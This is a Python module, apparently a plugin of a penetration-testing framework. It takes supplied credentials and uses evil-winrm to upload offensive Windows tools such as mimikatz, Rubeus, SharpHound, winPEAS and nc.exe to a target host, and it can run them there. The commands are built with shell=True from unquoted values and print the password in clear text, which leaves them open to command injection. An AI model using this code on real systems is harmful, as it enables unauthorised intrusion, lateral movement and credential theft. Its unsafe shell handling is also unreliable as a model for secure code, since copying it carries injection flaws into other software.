import os
import subprocess
from argparse import Namespace
from core.paths import get_tool_path

REQUIRES = ["creds"]
PROVIDES = []

TOOL_ALIASES = {
    "winpeas": get_tool_path("winPEASx64.exe"),
    "rubeus": get_tool_path("Rubeus.exe"),
    "nc": get_tool_path("nc.exe"),
    "mimikatz": get_tool_path("mimikatz.exe"),
    "sharphound": get_tool_path("sharphound.exe"),
}

def run(data, cred, args):
    ip = data["ip"]

    user = cred.get("user")
    secret = cred.get("secret")
    cred_type = cred.get("type")

    if cred_type != "password":
        print("[!] win.upload only supports password auth")
        return data

    if not user or not secret:
        print("[!] Missing valid credentials")
        return data

    # Resolve file (alias or direct path)
    local_file = TOOL_ALIASES.get(args.file, args.file)

    if args.file in TOOL_ALIASES:
        print(f"[+] Alias '{args.file}' → {local_file}")

    if not os.path.exists(local_file):
        print(f"[!] File not found: {local_file}")
        return data

    filename = os.path.basename(local_file)

    # -------------------
    # 1. Upload (current directory)
    # -------------------
    upload_cmd = (
        f'echo "upload {local_file}" | '
        f'evil-winrm -i {ip} -u {user} -p {secret}'
    )

    print(f"[*] Running: {upload_cmd}")
    subprocess.run(upload_cmd, shell=True)

    print(f"[+] Uploaded to current directory (Documents)")


    # -------------------
    # 3. Execute --run (oneshot via evil-winrm)
    # -------------------
    if getattr(args, "run", False):
        run_cmd = (
            f'echo ".\\{filename}" | '
            f'evil-winrm -i {ip} -u {user} -p {secret}'
        )

        print(f"[*] Running: {run_cmd}")
        subprocess.run(run_cmd, shell=True)

        return data

    return data